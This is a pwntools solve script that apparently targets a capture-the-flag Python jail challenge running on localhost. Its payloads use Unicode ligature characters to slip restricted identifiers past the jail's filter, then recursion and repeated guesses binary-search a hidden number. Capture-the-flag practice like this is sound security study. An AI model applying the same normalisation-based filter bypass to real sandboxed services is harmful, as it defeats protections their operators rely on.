from pwn import *
import sys

sys.set_int_max_str_digits(9999999)
# p = process(['python3', '../build/chall.py'])
# p  = remote('34.59.119.124', 32773)
p  = remote('localhost', 5000)

recursion_level = 0
guess_num = 0

def recv_until_guess() -> tuple[int, bytes]:
    global recursion_level
    r = p.recv()
    try:
        if b':' not in r:
            r += p.recvuntil(b':')
        r += p.recv(timeout=0.05)
    except Exception as e:
        print(e)
    recursion_level -= r.count(b'better luck next time')
    if b'#1' in r:
        return 1, r
    elif b'#2' in r:
        return 2, r
    else:
        return 0, r

def init_recurse():
    p.sendline('{z:=rǌail}'.encode())
    recv_until_guess()
    p.sendline('z.ﬅartRǌ()'.encode())
    recv_until_guess()

def recurse_level():
    global recursion_level
    recursion_level += 1
    p.sendline('z.ﬅartRǌ()'.encode())
    recv_until_guess()

def prepare_send():
    while recursion_level < 15:
        recurse_level()

def check_value():
    global guess_num
    guess_num += 1
    prepare_send()
    p.sendline(b'a')
    _, r = recv_until_guess()
    print(f'guess {guess_num}: {eval("a")}')
    if b'earned' in r:
        return 2, r
    if b'count' in r:
        return 0, r
    else:
        return 1, r
    
def send(s: str):
    global guess_num
    guess_num += 1
    eval(s, globals())
    prepare_send()
    p.sendline(s.encode())
    recv_until_guess()


init_recurse()
send('{a:=256}')
send('{c:=a}')
send('{d:=c*4}')
v, r = check_value()

while v==1:
    send('{a:=a<<d}')
    v, r = check_value()

while v==0:
    send('{a:=a>>c}')
    v, r = check_value()

while v==1:
    send('{a:=a<<8}')
    v, r = check_value()

while v==0:
    send('{a:=a>>1}')
    v, r = check_value()

send('{b:=a>>1}')
v, r = check_value()

while True:
    if v==1:
        send('{a:=a+b}')
    elif v==0:
        send('{a:=a-b}')
    else:
        print(r.decode())
        break
    send('{b:=b>>1}')
    v, r = check_value()